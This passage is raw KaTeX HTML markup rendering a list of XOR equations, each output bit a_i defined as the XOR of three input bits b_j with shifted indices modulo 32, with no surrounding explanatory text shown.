style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span><span class="mord mtight">6</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span><span style="top:-8.010000000000012em;"><span class="pstrut" style="height:3.008em;"></span><span class="mord"><span class="mord"><span class="mord mathdefault">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord"><span class="mord mathdefault">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">⊕</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord"><span class="mord mathdefault">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span><span class="mord mtight">3</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">⊕</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord"><span class="mord mathdefault">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span><span class="mord mtight">7</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span><span style="top:-6.570000000000015em;"><span class="pstrut" style="height:3.008em;"></span><span class="mord"><span class="mord"><span class="mord mathdefault">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span><span class="mord mtight">3</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord"><span class="mord mathdefault">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span><span class="mord mtight">3</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">⊕</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord"><span class="mord mathdefault">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span><span class="mord mtight">4</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">⊕</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord"><span class="mord mathdefault">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span><span class="mord mtight">8</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span><span style="top:-5.130000000000017em;"><span class="pstrut" style="height:3.008em;"></span><span class="mord"><span class="mord"><span class="mord mathdefault">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span><span class="mord mtight">4</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord"><span class="mord mathdefault">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span><span class="mord mtight">4</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">⊕</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord"><span class="mord mathdefault">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span><span class="mord mtight">5</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">⊕</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord"><span class="mord mathdefault">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span><span class="mord mtight">9</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span><span style="top:-3.690000000000019em;"><span class="pstrut" style="height:3.008em;"></span><span class="mord"><span class="mord"><span class="mord mathdefault">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span><span class="mord mtight">5</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord"><span class="mord mathdefault">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span><span class="mord mtight">5</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">⊕</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord"><span class="mord mathdefault">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span><span class="mord mtight">6</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">⊕</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord"><span class="mord mathdefault">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">3</span><span class="mord mtight">0</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span><span style="top:-2.2500000000000213em;"><span class="pstrut" style="height:3.008em;"></span><span class="mord"><span class="mord"><span class="mord mathdefault">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span><span class="mord mtight">6</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord"><span class="mord mathdefault">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span><span class="mord mtight">6</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">⊕</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord"><span class="mord mathdefault">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span><span class="mord mtight">7</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">⊕</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord"><span class="mord mathdefault">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">3</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span><span style="top:-0.8100000000000237em;"><span class="pstrut" style="height:3.008em;"></span><span class="mord"><span class="mord"><span class="mord mathdefault">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span><span class="mord mtight">7</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord"><span class="mord mathdefault">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span><span class="mord mtight">7</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">⊕</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord"><span class="mord mathdefault">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span><span class="mord mtight">8</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">⊕</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord"><span class="mord mathdefault">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">0</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span><span style="top:0.6299999999999736em;"><span class="pstrut" style="height:3.008em;"></span><span class="mord"><span class="mord"><span class="mord mathdefault">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span><span class="mord mtight">8</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord"><span class="mord mathdefault">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span><span class="mord mtight">8</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">⊕</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord"><span class="mord mathdefault">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span><span class="mord mtight">9</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">⊕</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord"><span class="mord mathdefault">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span><span style="top:2.0699999999999714em;"><span class="pstrut" style="height:3.008em;"></span><span class="mord"><span class="mord"><span class="mord mathdefault">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span><span class="mord mtight">9</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord"><span class="mord mathdefault">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span><span class="mord mtight">9</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">⊕</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord"><span class="mord mathdefault">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">3</span><span class="mord mtight">0</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">⊕</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord"><span class="mord mathdefault">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span><span style="top:3.509999999999969em;"><span class="pstrut" style="height:3.008em;"></span><span class="mord"><span class="mord"><span class="mord mathdefault">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span><span class="mord mtight">0</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord"><span class="mord mathdefault">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span><span class="mord mtight">0</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">⊕</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord"><span class="mord mathdefault">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">3</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">⊕</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord"><span class="mord mathdefault">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">3</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span><span style="top:4.949999999999966em;"><span class="pstrut" style="height:3.008em;"></span><span class="mord"><span class="mord"><span class="mord mathdefault">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord"><span class="mord mathdefault">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">⊕</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord"><span class="mord mathdefault">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">0</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">⊕</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord"><span class="mord mathdefault">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">4</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span><span style="top:6.389999999999968em;"><span class="pstrut" style="height:3.008em;"></span><span class="mord"><span class="mord"><span class="mord mathdefault">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord"><span class="mord mathdefault">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">⊕</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord"><span class="mord mathdefault">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">⊕</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord"><span class="mord mathdefault">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">5</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span><span style="top:7.829999999999972em;"><span class="pstrut" style="height:3.008em;"></span><span class="mord"><span class="mord"><span class="mord mathdefault">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span><span class="mord mtight">3</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord"><span class="mord mathdefault">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span><span class="mord mtight">3</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">⊕</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord"><span class="mord mathdefault">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" 